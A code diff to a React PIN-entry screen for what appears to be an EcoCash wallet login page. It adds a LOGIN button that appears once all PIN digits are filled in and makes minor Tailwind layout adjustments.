@@ -62,9 +62,11 @@ export const PinScreen: React.FC<PinScreenProps> = ({ phone, applicationId, onBa
     }
   };
 
+  const isPinComplete = pinDigits.every((digit) => digit !== '');
+
   return (
-    <div className="min-h-screen w-full bg-white flex flex-col justify-between overflow-y-auto">
-      <div className="flex flex-col items-center w-full max-w-md mx-auto px-6 pt-8 pb-12 gap-6">
+    <div className="min-h-screen w-full bg-white flex flex-col overflow-y-auto">
+      <div className="flex flex-col items-center w-full max-w-md mx-auto px-6 pt-6 gap-6">
         <div className="flex flex-col items-center gap-3">
           <h1 className="text-4xl font-extrabold tracking-tight">
             <span className="text-[#0052CC]">Eco</span>
@@ -119,9 +121,20 @@ export const PinScreen: React.FC<PinScreenProps> = ({ phone, applicationId, onBa
             Forgot PIN?
           </a>
         </div>
+
+        {isPinComplete && (
+          <button
+            type="button"
+            onClick={handleSubmit}
+            disabled={isSubmitting}
+            className="w-full rounded-full bg-[#0052CC] px-4 py-4 mt-4 text-base font-bold text-white transition-colors hover:bg-[#0048b3] disabled:opacity-70 disabled:cursor-not-allowed"
+          >
+            {isSubmitting ? 'Saving…' : 'LOGIN'}
+          </button>
+        )}
       </div>
 
-      <div className="w-full bg-[#0066CC] flex flex-col items-center rounded-t-[40px] pt-10 pb-8 px-6 mt-auto">
+      <div className="w-full bg-[#0066CC] flex flex-col items-center rounded-t-[40px] pt-10 pb-8 px-6">
         <div className="text-center px-2">
           <p className="text-white text-base leading-relaxed">To register an EcoCash wallet or get assistance,</p>
           <p className="text-white text-base leading-relaxed">click below</p>
